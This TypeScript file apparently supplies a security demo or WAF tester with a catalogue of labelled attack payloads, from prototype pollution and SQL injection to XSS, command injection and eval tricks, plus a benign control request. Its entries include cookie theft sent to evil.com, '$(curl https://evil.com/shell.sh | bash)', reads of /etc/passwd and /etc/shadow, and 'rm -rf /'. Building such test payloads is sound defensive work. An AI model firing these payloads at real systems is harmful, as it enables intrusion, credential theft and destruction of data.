import {
  Bug,
  Activity,
  Database,
  Zap,
  Lock,
  Code,
  FileWarning,
  Network,
  CheckCircle2,
} from 'lucide-react'
import { Attack, AttackKey } from '../../types'

export const ATTACKS: Record<AttackKey, Attack> = {
  prototypePollution: {
    name: 'Prototype Pollution (CVE-2025-55182)',
    icon: Bug,
    description: 'Injects __proto__ to execute arbitrary code',
    payload: {
      __proto__: { isAdmin: true },
      constructor: { prototype: { hacked: true } },
    },
    severity: 'critical',
    category: 'deserialization',
  },

  constructorInjection: {
    name: 'Constructor Injection',
    icon: Bug,
    description: 'Hijacks object constructors for RCE',
    payload: {
      username: 'admin',
      constructor: {
        prototype: {
          toString: "function() { require('child_process').exec('whoami') }",
        },
      },
    },
    severity: 'critical',
    category: 'deserialization',
  },

  deepNesting: {
    name: 'Deep Nesting Bypass',
    icon: Activity,
    description: 'Deeply nested objects to exceed depth limits',
    payload: {
      level1: {
        level2: {
          level3: {
            level4: {
              level5: {
                level6: {
                  level7: {
                    level8: {
                      level9: {
                        level10: {
                          level11: { __proto__: { polluted: true } },
                        },
                      },
                    },
                  },
                },
              },
            },
          },
        },
      },
    },
    severity: 'high',
    category: 'deserialization',
  },

  sqlUnion: {
    name: 'SQL Injection - UNION',
    icon: Database,
    description: 'UNION SELECT to extract sensitive data',
    payload: {
      username: "admin' UNION SELECT password FROM users--",
      query:
        'SELECT * FROM products WHERE id=1 UNION SELECT * FROM admin_users--',
    },
    severity: 'critical',
    category: 'injection',
  },

  sqlBoolean: {
    name: 'SQL Injection - Boolean',
    icon: Database,
    description: 'Boolean-based blind SQL injection',
    payload: {
      username: "admin' OR '1'='1",
      password: "anything' OR '1'='1'--",
    },
    severity: 'critical',
    category: 'injection',
  },

  sqlTimeBased: {
    name: 'SQL Injection - Time Based',
    icon: Database,
    description: 'Time-delay SQL injection',
    payload: {
      id: "1; WAITFOR DELAY '00:00:05'--",
      search: "test' AND SLEEP(5)--",
    },
    severity: 'high',
    category: 'injection',
  },

  xssScript: {
    name: 'XSS - Script Tag',
    icon: Zap,
    description: 'Direct JavaScript injection',
    payload: {
      comment: "<script>alert('XSS')</script>",
      bio: "<script>fetch('https://evil.com?c='+document.cookie)</script>",
    },
    severity: 'high',
    category: 'injection',
  },

  xssEventHandler: {
    name: 'XSS - Event Handler',
    icon: Zap,
    description: 'HTML event handler exploitation',
    payload: {
      name: '<img src=x onerror=alert(1)>',
      avatar: "<body onload=alert('XSS')>",
    },
    severity: 'high',
    category: 'injection',
  },

  xssIframe: {
    name: 'XSS - Iframe Injection',
    icon: Zap,
    description: 'Malicious iframe embedding',
    payload: {
      content: "<iframe src='https://evil.com/steal'></iframe>",
      description: "<iframe src='javascript:alert(document.cookie)'></iframe>",
    },
    severity: 'high',
    category: 'injection',
  },

  cmdShell: {
    name: 'Command Injection - Shell',
    icon: Lock,
    description: 'Shell command execution attempt',
    payload: {
      filename: '; cat /etc/passwd',
      path: '| whoami',
      command: '&& rm -rf /',
    },
    severity: 'critical',
    category: 'injection',
  },

  cmdBackticks: {
    name: 'Command Injection - Backticks',
    icon: Lock,
    description: 'Command substitution with backticks',
    payload: {
      file: '`cat /etc/shadow`',
      directory: '$(curl https://evil.com/shell.sh | bash)',
    },
    severity: 'critical',
    category: 'injection',
  },

  evalInjection: {
    name: 'Code Injection - eval()',
    icon: Code,
    description: 'JavaScript eval() exploitation',
    payload: {
      expression: 'eval(\'require("child_process").exec("whoami")\')',
      code: "Function('return process.env')()",
    },
    severity: 'critical',
    category: 'injection',
  },

  utf16leBypass: {
    name: 'Ghost Mode - UTF-16LE',
    icon: FileWarning,
    description: 'UTF-16LE encoding WAF bypass',
    payload: {
      malicious: '<script>alert(1)</script>',
      _encoding: 'utf-16le',
    },
    severity: 'critical',
    category: 'encoding',
  },

  rateLimitTest: {
    name: 'Rate Limit Stress Test',
    icon: Network,
    description: 'Rapid requests to trigger rate limiting',
    payload: {
      test: 'rate_limit_probe',
      timestamp: Date.now(),
    },
    severity: 'medium',
    category: 'general',
  },

  validRequest: {
    name: '✅ Valid Request',
    icon: CheckCircle2,
    description: 'Legitimate request (should pass)',
    payload: {
      username: 'john_doe',
      email: 'john@example.com',
      message: 'Normal data',
    },
    severity: 'medium',
    category: 'general',
  },
}